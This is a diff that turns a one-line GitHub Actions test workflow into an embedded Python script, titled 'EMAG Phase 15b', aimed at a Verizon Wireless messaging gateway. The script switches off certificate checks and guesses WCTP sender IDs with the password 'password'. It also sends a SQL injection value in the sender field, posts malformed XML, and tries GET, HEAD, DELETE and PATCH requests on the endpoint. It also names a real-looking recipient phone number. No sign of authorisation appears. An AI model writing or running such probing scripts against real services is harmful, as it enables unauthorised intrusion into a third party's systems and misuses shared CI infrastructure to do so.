@@ -1,9 +1,105 @@
-name: test
+name: EMAG Phase 15b
 on:
+  workflow_dispatch:
   push:
     branches: [main]
+
 jobs:
-  test:
+  phase15b:
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     steps:
-      - run: echo hi
+      - name: EMAG Phase 15b
+        run: |
+          python3 - << 'PYEOF'
+          import urllib.request, urllib.error, json, ssl, time, re
+          ctx = ssl.create_default_context()
+          ctx.check_hostname = False
+          ctx.verify_mode = ssl.CERT_NONE
+          BASE = "https://ess.emag.verizonwireless.com"
+          
+          def post_xml(url, xml_body):
+              data = xml_body.encode("utf-8") if xml_body else b""
+              rq = urllib.request.Request(url, data=data, method="POST",
+                  headers={"User-Agent": "Mozilla/5.0", "Content-Type": "text/xml",
+                           "Accept": "text/xml,*/*"})
+              try:
+                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+                  with op.open(rq, timeout=10) as r:
+                      return r.status, r.read(2048).decode(errors="replace")
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(1024).decode(errors="replace")
+              except Exception as e:
+                  return 0, str(e)
+          
+          print("=== Wayback Machine: EMAG snapshot ===")
+          for wb_target in [
+              "http://archive.org/wayback/available?url=ess.emag.verizonwireless.com/emag/",
+              "http://archive.org/wayback/available?url=emag.verizonwireless.com/",
+          ]:
+              rq2 = urllib.request.Request(wb_target, headers={"User-Agent": "Mozilla/5.0"})
+              try:
+                  with urllib.request.urlopen(rq2, timeout=15) as r:
+                      d = json.loads(r.read())
+                      print(f"Wayback {wb_target[-40:]}: {json.dumps(d)[:400]}")
+              except Exception as e:
+                  print(f"Wayback error: {e}")
+          
+          print()
+          print("=== WCTP senderID variance test ===")
+          def wctp_req(sid, pwd, num="+12283359820"):
+              xml = (f"<?xml version=\"1.0\"?>"
+                  f"<wctp-Operation wctpVersion=\"WCTP-DTD-V1r1\">"
+                  f"<wctp-SubmitRequest><wctp-SubmitHeader submitID=\"1\">"
+                  f"<wctp-Originator senderID=\"{sid}\" securityCode=\"{pwd}\"/>"
+                  f"<wctp-Recipient recipientID=\"{num}\"/>"
+                  f"</wctp-SubmitHeader>"
+                  f"<wctp-Payload><wctp-AlphanumericMessage>test</wctp-AlphanumericMessage></wctp-Payload>"
+                  f"</wctp-SubmitRequest></wctp-Operation>")
+              s, b = post_xml(BASE + "/emag/wctp", xml)
+              return s, b
+          
+          test_sids = ["1", "100", "12345", "99999", "EMAG", "TEST", "0", "vzw", "verizon"]
+          responses = {}
+          for sid in test_sids:
+              s, b = wctp_req(sid, "password")
+              key = (s, b[:100])
+              responses[key] = responses.get(key, []) + [sid]
+              print(f"[{s}] senderID={sid}: {b[:100]}")
+              time.sleep(0.3)
+          print(f"Unique responses: {len(responses)}")
+          for k, sids in responses.items():
+              print(f"  {k[0]}: {k[1][:60]} (sids={sids})")
+          
+          print()
+          print("=== WCTP malformed XML: does response differ? ===")
+          for label, xml_variant in [
+              ("empty", ""),
+              ("not-xml", "notxml"),
+              ("minimal-op", "<?xml version=\"1.0\"?><wctp-Operation/>"),
+              ("no-sender", "<?xml version=\"1.0\"?><wctp-Operation><wctp-SubmitRequest/></wctp-Operation>"),
+              ("sql-inj", "<?xml version=\"1.0\"?><wctp-Operation wctpVersion=\"WCTP-DTD-V1r1\"><wctp-SubmitRequest><wctp-SubmitHeader submitID=\"1\"><wctp-Originator senderID=\"1 OR 1=1\" securityCode=\"x\"/><wctp-Recipient recipientID=\"+12283359820\"/></wctp-SubmitHeader><wctp-Payload><wctp-AlphanumericMessage>test</wctp-AlphanumericMessage></wctp-Payload></wctp-SubmitRequest></wctp-Operation>"),
+          ]:
+              s, b = post_xml(BASE + "/emag/wctp", xml_variant)
+              print(f"[{s}] {label}: {b[:150]}")
+          
+          print()
+          print("=== WCTP GET vs HEAD vs DELETE ===")
+          for meth in ["GET", "HEAD", "DELETE", "PATCH"][:]:
+              rq = urllib.request.Request(BASE + "/emag/wctp", method=meth,
+                  headers={"User-Agent": "Mozilla/5.0"})
+              try:
+                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+                  with op.open(rq, timeout=10) as r:
+                      body = r.read(512).decode(errors="replace")
+                      loc = r.headers.get("Location", "")
+                      print(f"[{r.status}] {meth}: loc={loc[:80]} body={body[:80]}")
+              except urllib.error.HTTPError as e:
+                  loc = e.headers.get("Location", "")
+                  body = e.read(512).decode(errors="replace")
+                  print(f"[{e.code}] {meth}: loc={loc[:80]} body={body[:80]}")
+              except Exception as e:
+                  print(f"[ERR] {meth}: {e}")
+          
+          print("DONE")
+          PYEOF
